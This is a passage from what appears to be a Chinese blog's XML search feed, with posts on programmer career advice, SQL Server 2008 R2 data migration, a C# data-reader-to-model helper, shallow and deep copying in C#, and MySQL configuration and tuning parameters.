&#65289;&#20043;&#31867;&#30340;&#31243;&#24207;&#12290;b&#65289;&#20889;&#19968;&#20010;&#30011;UML&#22270;&#30340;&#31243;&#24207;&#12290;c&#65289;&#20889;&#19968;&#20010;&#35270;&#39057;&#25773;&#25918;&#31243;&#24207;&#65292;&#35201;&#33258;&#24049;&#20889;&#35299;&#30721;&#22120;&#12290;&#33258;&#24049;&#29420;&#31435;&#23436;&#25104;&#38656;&#27714;&#12289;&#35774;&#35745;&#12289;&#23454;&#29616;&#21644;&#27979;&#35797;&#31561;&#20840;&#37096;&#24037;&#20316;&#12290;7 程序员应该掌握的几个非程序员技能&#31243;&#24207;&#21592;&#19981;&#20165;&#35201;&#23398;&#20064;&#25216;&#26415;&#65292;&#20063;&#38656;&#35201;&#25484;&#25569;&#19968;&#20123;&#8220;&#38750;&#31243;&#24207;&#21592;&#8221;&#30340;&#25216;&#33021;&#65292;&#36825;&#20123;&#25216;&#33021;&#33021;&#24110;&#21161;&#20320;&#24320;&#38420;&#35270;&#37326;&#65292;&#21152;&#36895;&#20320;&#30340;&#25104;&#21151;&#65281;1&#65289;&#38656;&#27714;&#20998;&#26512;&#33021;&#21147;2&#65289;&#27963;&#29992;UML&#20998;&#26512;&#21450;&#35299;&#20915;&#38382;&#39064;&#30340;&#33021;&#21147;3&#65289;&#36719;&#20214;&#27979;&#35797;&#33021;&#21147;4&#65289;&#39033;&#30446;&#31649;&#29702;&#22522;&#26412;&#30693;&#35782;5&#65289;&#21475;&#22836;&#34920;&#36798;&#33021;&#21147;&#21644;&#20070;&#38754;&#34920;&#36798;&#33021;&#21147;6&#65289;&#22242;&#38431;&#21327;&#20316;&#33021;&#21147;&#20197;&#19978;&#30693;&#35782;&#19981;&#33021;&#21482;&#30475;&#20070;&#26412;&#65292;&#26356;&#20851;&#38190;&#26159;&#23454;&#38469;&#25805;&#32451;&#65292;&#25805;&#32451;&#30340;&#26368;&#26377;&#25928;&#21150;&#27861;&#23601;&#26159;&#65306;&#33258;&#24049;&#29420;&#31435;&#23436;&#25104;&#19968;&#20010;&#36719;&#20214;&#30340;&#25152;&#26377;&#24037;&#20316;&#65307;&#24403;&#33258;&#24049;&#20855;&#22791;&#19968;&#23450;&#22522;&#30784;&#21518;&#65292;&#23601;&#21644;&#20960;&#20010;&#21516;&#23398;&#25110;&#26379;&#21451;&#21435;&#25361;&#25112;&#26356;&#39640;&#38590;&#24230;&#21644;&#22797;&#26434;&#24230;&#30340;&#36719;&#20214;&#39033;&#30446;&#12290;8 职场上的一些小建议1&#65289;&#24819;&#28165;&#26970;&#33258;&#24049;&#24819;&#24178;&#20160;&#20040;&#12290;&#26143;&#29239;&#35828;&#36807;&#65306;&#20154;&#29983;&#27809;&#26377;&#29702;&#24819;&#65292;&#21644;&#19968;&#26465;&#21688;&#40060;&#27809;&#26377;&#20160;&#20040;&#20998;&#21035;&#65281;&#20154;&#29983;&#33021;&#26377;&#22810;&#23569;&#20010;&#21313;&#24180;&#65292;&#35201;&#23613;&#26089;&#21457;&#29616;&#33258;&#24049;&#24819;&#24178;&#20160;&#20040;&#65292;&#24182;&#35201;&#23613;&#26089;&#20570;&#22909;&#36890;&#30424;&#35268;&#21010;&#12290;2&#65289;&#22810;&#20026;&#33258;&#24049;&#30528;&#24819;&#65292;&#19981;&#35201;&#22826;&#36807;&#39038;&#20840;&#22823;&#23616;&#12290;&#35835;&#22823;&#23398;&#26102;&#65292;&#32769;&#24072;&#32473;&#25105;&#30340;&#35780;&#20215;&#26159;&#65306;&#32508;&#21512;&#32032;&#36136;&#21644;&#33021;&#21147;&#24456;&#24378;&#12290;&#24037;&#20316;&#21518;&#65292;&#32769;&#26495;&#32473;&#25105;&#30340;&#35780;&#20215;&#20063;&#26159;&#36825;&#26679;&#12290;&#20294;&#36825;&#26679;&#30340;&#35780;&#20215;&#65292;&#21487;&#33021;&#20250;&#24102;&#26469;&#26479;&#20855;&#30340;&#20107;&#24773;&#8230;&#8230;&#22240;&#20026;&#25105;&#32508;&#21512;&#32032;&#36136;&#21644;&#33021;&#21147;&#24378;&#65292;&#25152;&#20197;&#22312;&#23433;&#25490;&#24037;&#20316;&#30340;&#26102;&#20505;&#65292;&#21035;&#20154;&#37117;&#21487;&#20197;&#25361;&#19968;&#20123;&#20182;&#21916;&#27426;&#25110;&#20182;&#25797;&#38271;&#30340;&#20107;&#24773;&#20570;&#65292;&#32780;&#25105;&#22240;&#20026;&#26159;&#8220;&#20840;&#33021;&#8221;&#30340;&#65292;&#25152;&#20197;&#25105;&#35201;&#21435;&#24178;&#19968;&#20123;&#21035;&#20154;&#19981;&#21916;&#27426;&#25110;&#19981;&#25797;&#38271;&#30340;&#20107;&#24773;&#12290;&#25105;&#26366;&#32463;&#35797;&#36807;&#22909;&#22810;&#27425;&#23558;&#33258;&#24049;&#24819;&#30740;&#31350;&#30340;&#25216;&#26415;&#28857;&#35753;&#32473;&#21035;&#20154;&#65292;&#20037;&#32780;&#20037;&#20043;&#25105;&#23601;&#22833;&#21435;&#20102;&#24456;&#22810;&#25484;&#25569;&#39640;&#31934;&#23574;&#25216;&#26415;&#30340;&#26426;&#20250;&#12290;&#33267;&#20170;&#20026;&#27490;&#25105;&#22312;&#25216;&#26415;&#19978;&#30340;&#19968;&#20010;&#26368;&#22823;&#36951;&#25022;&#23601;&#26159;&#65292;&#27809;&#26377;&#33021;&#31934;&#36890;C++&#32534;&#31243;&#65292;&#25105;&#26366;&#32463;&#26377;&#26426;&#20250;&#21644;&#26377;&#26465;&#20214;&#21435;&#24320;&#21457;C++&#30340;&#32472;&#22270;&#31243;&#24207;&#30340;&#65292;&#20294;&#25105;&#35753;&#32473;&#21035;&#20154;&#20102;&#8230;&#8230;&#8220;&#20154;&#19981;&#20026;&#24049;&#22825;&#35803;&#22320;&#28781;&#8221;&#36825;&#21477;&#35805;&#24456;&#26377;&#36947;&#29702;&#65292;&#24403;&#28982;&#19981;&#26159;&#35201;&#20320;&#21435;&#33258;&#31169;&#33258;&#21033;&#65292;&#20294;&#20063;&#19981;&#33021;&#22826;&#36807;&#20110;&#8220;&#22823;&#20844;&#26080;&#31169;&#8221;&#65292;&#26681;&#25454;&#33258;&#24049;&#30340;&#21457;&#23637;&#36335;&#32447;&#65292;&#35201;&#20027;&#21160;&#21435;&#20105;&#21462;&#19968;&#20123;&#33021;&#25552;&#21319;&#20320;&#30340;&#25216;&#33021;&#30340;&#26426;&#20250;&#12290;3&#65289;&#19981;&#35201;&#35828;&#23569;&#22810;&#20570;&#65292;&#35201;&#22810;&#35828;&#22810;&#20570;&#12290;&#8220;&#23569;&#35828;&#22810;&#20570;&#8221;&#34987;&#35465;&#20026;&#19968;&#31181;&#32654;&#24503;&#65292;&#20294;&#27599;&#20010;&#20844;&#21496;&#37117;&#20250;&#26377;&#21150;&#20844;&#23460;&#25919;&#27835;&#65292;&#23569;&#35828;&#22810;&#20570;&#20250;&#35753;&#20320;&#21507;&#22823;&#20111;&#65292;&#20320;&#38656;&#35201;&#30340;&#26159;&#22810;&#35828;&#22810;&#20570;&#65281;&#38500;&#20102;&#35201;&#24178;&#22909;&#20107;&#24773;&#65292;&#20063;&#38656;&#35201;&#35753;&#20320;&#30340;&#32769;&#26495;&#12289;&#21516;&#20107;&#21450;&#26102;&#30693;&#36947;&#20320;&#30340;&#24037;&#20316;&#25104;&#32489;&#12290;&#25104;&#21151;&#20154;&#22763;&#19981;&#20165;&#20165;&#26159;&#38752;&#23454;&#21147;&#30340;&#65292;&#36824;&#38656;&#35201;&#21253;&#35013;&#21644;&#23459;&#20256;&#12290;4&#65289;&#31934;&#36890;&#25216;&#26415;&#33021;&#24110;&#20320;&#21019;&#19994;&#65292;&#31934;&#36890;&#31649;&#29702;&#21487;&#33021;&#21482;&#33021;&#24110;&#20320;&#25214;&#21040;&#22909;&#24037;&#20316;&#12290;&#22823;&#23398;&#27605;&#19994;&#20043;&#21069;&#65292;&#25105;&#30340;&#32844;&#19994;&#35268;&#21010;&#26159;&#36825;&#26679;&#30340;&#65306;&#20105;&#21462;&#20960;&#24180;&#20869;&#36798;&#21040;&#26376;&#20837;&#36807;&#19975;&#65292;&#28982;&#21518;&#20105;&#21462;5&#24180;&#24038;&#21491;&#30340;&#26102;&#38388;&#33021;&#36890;&#36807;&#25171;&#24037;&#31215;&#32047;&#19968;&#28857;&#28857;&#30340;&#38065;&#21644;&#25216;&#26415;&#65292;&#28982;&#21518;&#36890;&#36807;&#33258;&#24049;&#30340;&#25216;&#26415;&#21435;&#21019;&#19994;&#12290;&#21487;&#33021;&#24456;&#22810;&#31243;&#24207;&#21592;&#37117;&#26377;&#36825;&#26679;&#30340;&#31867;&#20284;&#24819;&#27861;&#12290;&#25105;&#26366;&#32463;&#35797;&#36807;&#20004;&#27425;&#21019;&#19994;&#65306;&#31532;&#19968;&#27425;&#21019;&#19994;&#65306;&#25105;&#25171;&#24037;&#30340;&#21516;&#26102;&#21644;&#19968;&#20123;&#26379;&#21451;&#21512;&#20249;&#25104;&#31435;&#19968;&#20010;&#20844;&#21496;&#65292;&#25105;&#36127;&#36131;&#24320;&#21457;&#36719;&#20214;&#65292;&#25105;&#30340;&#21512;&#20316;&#20249;&#20276;&#36127;&#36131;&#24066;&#22330;&#26041;&#38754;&#30340;&#24037;&#20316;&#12290;&#20294;&#26368;&#32456;&#36824;&#26159;&#22833;&#36133;&#20102;&#12290;&#31532;&#20108;&#27425;&#21019;&#19994;&#65306;&#20174;2010&#24180;&#24320;&#22987;&#25105;&#36766;&#32844;&#20986;&#26469;&#21333;&#24178;&#65292;&#20840;&#32844;&#20570;&#36719;&#20214;&#30740;&#21457;&#26041;&#38754;&#30340;&#21672;&#35810;&#21644;&#22521;&#35757;&#26381;&#21153;&#12290;&#30446;&#21069;&#27491;&#22312;&#36827;&#34892;&#20013;&#8230;&#8230;&#22914;&#26524;&#20320;&#25216;&#26415;&#36275;&#22815;&#29275;B&#65292;&#33021;&#25214;&#21040;&#21512;&#36866;&#30340;&#21512;&#20316;&#20249;&#20276;&#65292;&#24182;&#19988;&#33021;&#25214;&#21040;&#25237;&#36164;&#20154;&#65292;&#37027;&#20040;&#25104;&#21151;&#30340;&#26426;&#20250;&#26159;&#24456;&#22823;&#30340;&#65281;&#26377;&#25216;&#26415;&#20320;&#23601;&#26377;&#21019;&#19994;&#30340;&#26412;&#38065;&#12290;&#25105;&#31532;&#20108;&#27425;&#21019;&#19994;&#23601;&#27604;&#36739;&#23604;&#23596;&#20102;&#65292;&#24403;&#26102;&#25105;&#24050;&#32463;&#24178;&#20102;&#24456;&#22810;&#24180;&#30340;&#31649;&#29702;&#24037;&#20316;&#65292;&#25216;&#26415;&#19978;&#24050;&#32463;&#34987;&#24223;&#27494;&#21151;&#65292;&#25105;&#30340;&#21435;&#36335;&#21487;&#33021;&#21482;&#26377;&#20004;&#20010;&#36873;&#25321;&#65306;a&#65289;&#25214;&#19968;&#20010;&#26032;&#20844;&#21496;&#20219;&#32844;&#31649;&#29702;&#23618;&#30340;&#32844;&#20301;&#65307;b&#65289;&#21019;&#19994;&#25630;&#21672;&#35810;&#21644;&#22521;&#35757;&#26041;&#38754;&#30340;&#20107;&#24773;&#12290;&#25105;&#19981;&#24819;&#20877;&#25171;&#24037;&#65292;&#25152;&#20197;&#36873;&#25321;&#20102;b&#65289;&#65292;&#20294;&#25630;&#22521;&#35757;&#21644;&#21672;&#35810;&#20854;&#23454;&#26159;&#24456;&#38590;&#20570;&#22823;&#30340;&#65292;&#27599;&#27425;&#19978;&#35838;&#20854;&#23454;&#37117;&#26159;&#20307;&#21147;&#27963;+&#33041;&#21147;&#27963;&#12290;&#36825;&#19982;&#25105;&#22810;&#24180;&#21069;&#30340;&#26790;&#24819;&#26159;&#23436;&#20840;&#19981;&#19968;&#26679;&#30340;&#65292;&#25105;&#26399;&#24453;&#33258;&#24049;&#30340;&#20844;&#21496;&#20855;&#22791;&#26680;&#24515;&#25216;&#26415;&#65292;&#24182;&#19988;&#36825;&#20010;&#26680;&#24515;&#25216;&#26415;&#33021;&#20026;&#31038;&#20250;&#24102;&#26469;&#24456;&#22823;&#20215;&#20540;&#65292;&#20844;&#21496;&#33021;&#36890;&#36807;&#36825;&#26679;&#30340;&#27169;&#24335;&#36186;&#21040;&#24456;&#22810;&#38065;&#12290;9 小结&#27599;&#20010;&#20154;&#37117;&#20250;&#26377;&#33258;&#24049;&#25104;&#38271;&#20043;&#36335;&#65292;&#27599;&#20301;&#20225;&#19994;&#23478;&#37117;&#20250;&#26377;&#33258;&#24049;&#30340;&#21019;&#19994;&#20043;&#36335;&#12290;&#25105;&#36208;&#20102;&#19981;&#23569;&#24367;&#36335;&#65292;&#26412;&#25991;&#20998;&#20139;&#19968;&#20123;&#23567;&#24515;&#24471;&#65292;&#24076;&#26395;&#33021;&#23545;&#20320;&#26377;&#19968;&#28857;&#28857;&#23567;&#24110;&#21161;&#12290;&#27880;&#65306;&#26631;&#39064;&#22270;&#29255;&#26469;&#33258;&#32593;&#32476;]]></content>
      <categories>
        
          <category> 职业生涯 </category>
        
      </categories>
      <tags>
        
          <tag> 职业生涯规划 </tag>
        
          <tag> Career-Planning </tag>
        
          <tag> Programmer </tag>
        
          <tag> 程序员 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SQL-Server 使用笔记]]></title>
      <url>/database/2017/04/11/sql-server/</url>
      <content type="text"><![CDATA[1 SQL server 2008 R2数据迁移到20081.1 情况描述今天，特意查阅了一下为什么在sql server 2008 R2上建的数据库迁移到sql server 2008上就出错,问题的关键在于如何保留原有表结构的主键、外键等，分两个情况，对于数据库数据量小的，可以很方便的解决。1.2 第一种：小数据的情况先在低版本的服务器上建立同名的数据库.在高版本的服务器上右键点击目标数据库-&gt;任务-&gt;生成脚本.在选择对象-&gt;选择特定数据库对象.选择表、视图、存储过程，然后下一步.关键在这，这一步里，请选择”高级“，选项里选择[编写DROP和Create脚本]项的”编写DROP和Create脚本“.选择服务器数据库版本.选择[编写脚本和数据类型]项的“架构和数据".保存脚本,在低版本的数据库下执行脚本即可.1.3 第二种：大数据的情况按理应该也可以通过类似包含架构和数据的方式来做，但是由于包含大数据的时候脚本文件太大，无法在分析器里执行，所以我们得绕一下.1～4步和小数据情况相同.这步我们选择”高级“，选项里选择[编写DROP和Create脚本]项的”编写DROP和Create脚本“，以及[为服务器版本编写脚本] sql server 2008(具体看数据库的版本)，最后选[编写脚本和数据类型]项的“架构".保存脚本.在低版本的数据下执行脚本，注意（ALTER TABLE 表名 WITH CHECK ADD CONSTRAINT [外键名] FOREIGN KEY(字段)REFERENCES表名(字段))这个先不要执行.现在可以通过导入导出任务先将表的内容导入到低版本的数据库内.再执行脚本内（ALTER TABLE 表名 WITH CHECK ADD CONSTRAINT [外键名] FOREIGN KEY(字段) REFERENCES 表名(字段))这样的语句，此处将表的外键附加上.]]></content>
      <categories>
        
          <category> database </category>
        
      </categories>
      <tags>
        
          <tag> SQL-Server </tag>
        
          <tag> SQL-Server-2008 </tag>
        
          <tag> SQL-Server-2008-R2 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[C# ASP.NET 公共函数]]></title>
      <url>/c%23/2017/03/28/c-list/</url>
      <content type="text"><![CDATA[如果您遇到任何问题，请发送邮件至zrg1390556487@gmail.com。1 Model 处理类using System;using System.Collections.Generic;using System.ComponentModel;using System.Data;using System.Linq;using System.Reflection;using System.Text;using System.Threading.Tasks;namespace ZCKJ.Common{    public class ModelHandler    {        /// &lt;summary&gt;        ///     &#20174; reader &#23545;&#35937;&#20013;&#36880;&#34892;&#35835;&#21462;&#35760;&#24405;&#24182;&#23558;&#35760;&#24405;&#36716;&#21270;&#20026; T &#31867;&#22411;&#30340;&#38598;&#21512;        /// &lt;/summary&gt;        /// &lt;typeparam name="T"&gt;&#30446;&#26631;&#31867;&#22411;&#21442;&#25968;&lt;/typeparam&gt;        /// &lt;param name="reader"&gt;&#23454;&#29616; IDataReader &#25509;&#21475;&#30340;&#23545;&#35937;&#12290;&lt;/param&gt;        /// &lt;returns&gt;&#25351;&#23450;&#31867;&#22411;&#30340;&#23545;&#35937;&#38598;&#21512;&#12290;&lt;/returns&gt;        public static List&lt;T&gt; ConvertToObject&lt;T&gt;(IDataReader reader)            where T : class        {            List&lt;T&gt; list = new List&lt;T&gt;();            T obj = default(T);            Type t = typeof(T);            Assembly ass = t.Assembly;            Dictionary&lt;string, PropertyInfo&gt; propertys = ModelHandler.GetFields&lt;T&gt;(reader);            PropertyInfo p = null;            if (reader != null)            {                while (reader.Read())                {                    obj = ass.CreateInstance(t.FullName) as T;                    foreach (string key in propertys.Keys)                    {                        p = propertys[key];                        p.SetValue(obj, ModelHandler.ChangeType(reader[key], p.PropertyType), null);                    }                    list.Add(obj);                }            }            return list;        }        /// &lt;summary&gt;        ///     &#20174; DataTale &#23545;&#35937;&#20013;&#36880;&#34892;&#35835;&#21462;&#35760;&#24405;&#24182;&#23558;&#35760;&#24405;&#36716;&#21270;&#20026; T &#31867;&#22411;&#30340;&#38598;&#21512;        /// &lt;/summary&gt;        /// &lt;typeparam name="T"&gt;&#30446;&#26631;&#31867;&#22411;&#21442;&#25968;&lt;/typeparam&gt;        /// &lt;param name="reader"&gt;DataTale &#23545;&#35937;&#12290;&lt;/param&gt;        /// &lt;returns&gt;&#25351;&#23450;&#31867;&#22411;&#30340;&#23545;&#35937;&#38598;&#21512;&#12290;&lt;/returns&gt;        public static List&lt;T&gt; ConvertToObject&lt;T&gt;(DataTable table)            where T : class        {            return table == null                ? new List&lt;T&gt;()                : ModelHandler.ConvertToObject&lt;T&gt;(table.CreateDataReader() as IDataReader);        }        /// &lt;summary&gt;        ///     &#23558;&#25968;&#25454;&#36716;&#21270;&#20026; type &#31867;&#22411;        /// &lt;/summary&gt;        /// &lt;param name="value"&gt;&#35201;&#36716;&#21270;&#30340;&#20540;&lt;/param&gt;        /// &lt;param name="type"&gt;&#30446;&#26631;&#31867;&#22411;&lt;/param&gt;        /// &lt;returns&gt;&#36716;&#21270;&#20026;&#30446;&#26631;&#31867;&#22411;&#30340; Object &#23545;&#35937;&lt;/returns&gt;        private static object ChangeType(object value, Type type)        {            if (type.FullName == typeof(string).FullName)            {                return Convert.ChangeType(Convert.IsDBNull(value) ? null : value, type);            }            else if (type.FullName == typeof(DateTime).FullName)            {                if (value != null &amp;&amp; value != DBNull.Value)                {                    NullableConverter convertor = new NullableConverter(type);                    return Convert.IsDBNull(value) ? null : convertor.ConvertFrom(value);                }                else                {                    return null;                }            }            if (type.IsGenericType &amp;&amp; type.GetGenericTypeDefinition().Equals(typeof(Nullable&lt;&gt;)))            {                NullableConverter convertor = new NullableConverter(type);                return Convert.IsDBNull(value) ? null : convertor.ConvertFrom(value);            }            return value;        }        /// &lt;summary&gt;        ///     &#33719;&#21462;reader&#23384;&#22312;&#24182;&#19988;&#22312; T &#31867;&#20013;&#21253;&#21547;&#21516;&#21517;&#21487;&#20889;&#23646;&#24615;&#30340;&#38598;&#21512;        /// &lt;/summary&gt;        /// &lt;param name="reader"&gt;        ///     &#21487;&#20889;&#22495;&#30340;&#38598;&#21512;        /// &lt;/param&gt;        /// &lt;returns&gt;        ///     &#20197;&#23646;&#24615;&#21517;&#20026;&#38190;&#65292;PropertyInfo &#20026;&#20540;&#24471;&#23383;&#20856;&#23545;&#35937;        /// &lt;/returns&gt;        private static Dictionary&lt;string, PropertyInfo&gt; GetFields&lt;T&gt;(IDataReader reader)        {            Dictionary&lt;string, PropertyInfo&gt; result = new Dictionary&lt;string, PropertyInfo&gt;();            int columnCount = reader.FieldCount;            Type t = typeof(T);            PropertyInfo[] properties = t.GetProperties();            if (properties != null)            {                List&lt;string&gt; readerFields = new List&lt;string&gt;();                for (int i = 0; i &lt; columnCount; i++)                {                    readerFields.Add(reader.GetName(i));                }                //IEnumerable&lt;PropertyInfo&gt; resList =                //    (from PropertyInfo prop in properties                //     where prop.CanWrite &amp;&amp; readerFields.Contains(prop.Name.ToUpper())                //     select prop);                IEnumerable&lt;PropertyInfo&gt; resList =                    (from PropertyInfo prop in properties                     where prop.CanWrite &amp;&amp; readerFields.Contains(prop.Name)                     select prop);                foreach (PropertyInfo p in resList)                {                    result.Add(p.Name, p);                }            }            return result;        }    }}]]></content>
      <categories>
        
          <category> c# </category>
        
      </categories>
      <tags>
        
          <tag> C# </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[C# ASP.NET 之浅拷贝与深拷贝]]></title>
      <url>/c%23/2016/11/20/asp.net-clone/</url>
      <content type="text"><![CDATA[1 写在前面最近两天，对"树（tree）"进行搜索，将搜索到的结果进行简单处理，并相应的改变样式。因为tree从session中取值，故而每次搜索后处理的结果都会都会改变原有session值。此时，不得不使用“深度复制”的方式去解原数据被修改的问题。2 关于浅拷贝与深拷贝2.1 定义2.1.1 浅拷贝(Shallow Copy)只复制对象的基本类型、对象类型，仍属于原来的引用。2.1.2 深拷贝(Deep Copy)不仅复制对象的基本类型，同时也复制对象的数据，完全产生新对象，是克隆的过程。2.2 区别浅表复制只复制值类型的值，而对于实例所包含的对象依然指向原有实例。3 浅拷贝1.浅拷贝codepublic Person ShallowCopy(){    return this.MemberwiseClone() as Person;//MemberwiseClone:将当前对象浅拷贝一份。}2.调用Person person=new Person();person.name="张三";person.age=18;person.email="1234567890@qq.com;//浅拷贝Person person2=person.ShallowCopy();4 深拷贝1.深拷贝code：public static IList&lt;T&gt; Clone&lt;T&gt;(IList&lt;VehicleTreeModel&gt; list){    BinaryFormatter formatter = new BinaryFormatter();    using (MemoryStream memorystream = new MemoryStream())    {	formatter.Serialize(memorystream, list);	memorystream.Position = 0;	return formatter.Deserialize(memorystream) as List&lt;T&gt;;    }}2.序列化标识#+BEGIN_SRC[Serializable]public class VehicleTreeModel : CompanyModel{   ...}[Serializable]public class CompanyModel{   ...}3.调用IList&lt;VehicleTreeModel&gt; deepCopyList = Clone&lt;VehicleTreeModel&gt;(list);5 参考资料http://blog.csdn.net/flyingdream123/article/details/9294973http://blog.csdn.net/xjavasunjava/article/details/7648242https://en.wikipedia.org/wiki/Object_copy6 结语此次完全理解了浅度复制和深度复制，并应用于实际当中。]]></content>
      <categories>
        
          <category> c# </category>
        
      </categories>
      <tags>
        
          <tag> C#-深拷贝 </tag>
        
          <tag> C#-浅拷贝 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[MySQL 配置与优化]]></title>
      <url>/database/2016/11/15/mysql-configure-optimization/</url>
      <content type="text"><![CDATA[1 前言MySQL配置与优化2 命令2.1 show--&#26174;&#31034;&#25968;&#25454;&#24211;&#21015;&#34920;&gt;show databases;--&#26174;&#31034;&#34920;&#30340;&#21015;&#34920;&gt;show tables;&gt;show columns from table_name;--&#29992;&#20197;&#26174;&#31034;&#26381;&#21153;&#22120;&#29366;&#24577;&#20449;&#24687;&gt;show status;&gt;SHOW STATUS LIKE '%&#21464;&#37327;&#21517;% ';--&#26174;&#31034;&#21019;&#24314;&#29305;&#23450;&#25968;&#25454;&#24211;&#25110;&#34920;&#30340;MySQL&#35821;&#21477;&gt;show create database;&gt;show create table;--&#26174;&#31034;&#25480;&#20104;&#29992;&#25143;&#65288;&#25152;&#26377;&#29992;&#25143;&#25110;&#29305;&#23450;&#29992;&#25143;&#65289;&#30340;&#23433;&#20840;&#26435;&#38480;&gt;show grants;--&#26174;&#31034;&#38169;&#35823;&#25110;&#35686;&#21578;&#20449;&#24687;&gt;show errors;&gt;show warnings;--&#26174;&#31034;&#31995;&#32479;&#21464;&#37327;&gt;SHOW VARIABLES;3 配置参数3.1 连接请求的变量3.1.1 max_connectionsMySQL的最大连接数。数值过小会经常出现ERROR 1040: Too many connections错误，可以过’conn%’通配符查看当前状态的连接数量，以定夺该值的大小。show variables like ‘max_connections’ 最大连接数show status like ‘max_used_connections’响应的连接数max_used_connections / max_connections * 100% （理想值≈ 85%），如果max_used_connections跟max_connections相同 那么就是max_connections设置过低或者超过服务器负载上限了，低于10%则设置过大。3.1.2 back_log MySQL能暂存的连接数量。用以当主要的MySQL线程在一个很短时间内得到非常多的连接请求时。如果MySQL的连接数据达到max_connections时，新来的请求将会被存在堆栈中，以等待某一连接释放资源，该堆栈的数量即back_log，如果等待连接的数量超过back_log，将不被授予连接资源。注1：当观察你主机进程列表（mysql&gt; show full processlist），发现大量264084 | unauthenticated user | xxx.xxx.xxx.xxx | NULL | Connect | NULL | login | NULL 的待连接进程时，就要加大back_log 的值了。注2：默认数值是50，可调优为128，对于Linux系统设置范围为小于512的整数。3.1.3 interactive_timeout一个交互连接在被服务器在关闭前等待行动的秒数。默认数值是28800，可调优为7200。3.2 缓冲区变量3.2.1 key_buffer_size索引缓冲区的大小，它决定索引处理的速度，尤其是索引读的速度。通过检查状态值Key_read_requests和Key_reads，可以知道key_buffer_size设置是否合理。比例key_reads / key_read_requests应该尽可能的低，至少是1:100，1:1000更好（上述状态值可以使用SHOW STATUS LIKE ‘key_read%’获得）。key_buffer_size只对MyISAM表起作用。即使你不使用MyISAM表，但是内部的临时磁盘表是MyISAM表，也要使用该值。可以使用检查状态值created_tmp_disk_tables得知详情。3.2.2 query_cache_size查询缓冲大小，MySQL将查询结果存放在缓冲区中，今后对于同样的SELECT语句（区分大小写），将直接从缓冲区中读取结果。通过检查状态值Qcache_*，可以知道query_cache_size设置是否合理（上述状态值可以使用SHOW STATUS LIKE ‘Qcache%’获得）。如果Qcache_lowmem_prunes的值非常大，则表明经常出现缓冲不够的情况，如果Qcache_hits的值也非常大，则表明查询缓冲使用非常频繁，此时需要增加缓冲大小；如果Qcache_hits的值不大，则表明你的查询重复率很低，这种情况下使用查询缓冲反而会影响效率，那么可以考虑不用查询缓冲。此外，在SELECT语句中加入SQL_NO_CACHE可以明确表示不使用查询缓冲。与查询缓冲有关的参数还有：query_cache_type指定是否使用查询缓冲，可以设置为0、1、2，该变量是SESSION级的变量。query_cache_limit指定单个查询能够使用的缓冲区大小，缺省为1M。query_cache_min_res_unit是在4.1版本以后引入的，它指定分配缓冲区空间的最小单位，缺省为4K。检查状态值Qcache_free_blocks，如果该值非常大，则表明缓冲区中碎片很多，这就表明查询结果都比较小，此时需要减小query_cache_min_res_unit。mysql&gt; show global status like ‘qcache%‘;mysql&gt; show variables like ‘query_cache%‘;查询缓存碎片率= Qcache_free_blocks / Qcache_total_blocks * 100% 。如果查询缓存碎片率超过20%，可以用FLUSH QUERY CACHE整理缓存碎片，或者试试减小query_cache_min_res_unit，如果你的查询都是小数据量的话。查询缓存利用率= (query_cache_size – Qcache_free_memory) / query_cache_size * 100%。查询缓存利用率在25%以下的话说明query_cache_size设置的过大，可适当减小；查询缓存利用率在80％以上而且Qcache_lowmem_prunes &gt; 50的话说明query_cache_size可能有点小，要不就是碎片太多。查询缓存命中率= (Qcache_hits – Qcache_inserts) / Qcache_hits * 100%。关于query_cache_type=OPTION：Set the query cache type. Possible options are as follows:0 : Don't cache results in or retrieve results from the query cache.1 : Cache all query results except for those that begin with SELECT S_NO_CACHE.2 : Cache results only for queries that begin with SELECT SQL_CACHE3.2.3 record_buffer_size每个进行一个顺序扫描的线程为其扫描的每张表分配这个大小的一个缓冲区。如果你做很多顺序扫描，你可能想要增加该值。默认数值是131072(128K)，可改为16773120 (16M)3.2.4 read_rnd_buffer_size随机读缓冲区大小。当按任意顺序读取行时(例如，按照排序顺序)，将分配一个随机读缓存区。进行排序查询时，MySQL会首先扫描一遍该缓冲，以避免磁盘搜索，提高查询速度，如果需要排序大量数据，可适当调高该值。但MySQL会为每个客户连接发放该缓冲空间，所以应尽量适当设置该值，以避免内存开销过大。一般可设置为16M 3.2.5 sort_buffer_size联合查询操作所能使用的缓冲区大小record_buffer_size，read_rnd_buffer_size，sort_buffer_size，join_buffer_size为每个线程独占，也就是说，如果有100个线程连接，则占用为16M*1003.2.6 join_buffer_size联合查询操作所能使用的缓冲区大小。record_buffer_size，read_rnd_buffer_size，sort_buffer_size，join_buffer_size为每个线程独占，也就是说，如果有100个线程连接，则占用为16M*1003.2.7 table_cache表高速缓存的大小。通过检查峰值时间的状态值Open_tables和Opened_tables，可以决定是否需要增加table_cache的值。如果你发现open_tables等于table_cache，并且opened_tables在不断增长，那么你就需要增加table_cache的值了（上述状态值可以使用SHOW STATUS LIKE ‘Open%tables’获得）。注意，不能盲目地把table_cache设置成很大的值。如果设置得太高，可能会造成文件描述符不足，从而造成性能不稳定或者连接失败。1G内存机器，推荐值是128－256。内存在4GB左右的服务器该参数可设置为256M或384M。3.2.8 max_heap_table_size用户可以创建的内存表(memory table)的大小。这个值用来计算内存表的最大行数值。这个变量支持动态改变，即set @max_heap_table_size=#这个变量和tmp_table_size一起限制了内部内存表的大小。如果某个内部heap（堆积）表大小超过tmp_table_size，MySQL可以根据需要自动将内存中的heap表改为基于硬盘的MyISAM表。3.2.9 tmp_table_size通过设置tmp_table_size选项来增加一张临时表的大小，例如做高级GROUP BY操作生成的临时表。如果调高该值，MySQL同时将增加heap表的大小，可达到提高联接查询速度的效果，建议尽量优化查询，要确保查询过程中生成的临时表在内存中，避免临时表过大导致生成基于硬盘的MyISAM表。默认为16M，可调到64-256最佳，线程独占，太大可能内存不够I/O堵塞。3.2.10 thread_cache_size可以复用的保存在中的线程的数量。如果有，新的线程从缓存中取得，当断开连接的时候如果有空间，客户的线置在缓存中。如果有很多新的线程，为了提高性能可以这个变量值。通过比较 Connections和Threads_created状态的变量，可以看到这个变量的作用。默认值为110，可调优为80。3.2.11 thread_concurrency推荐设置为服务器 CPU核数的2倍，例如双核的CPU, 那么thread_concurrency的应该为4；2个双核的cpu, 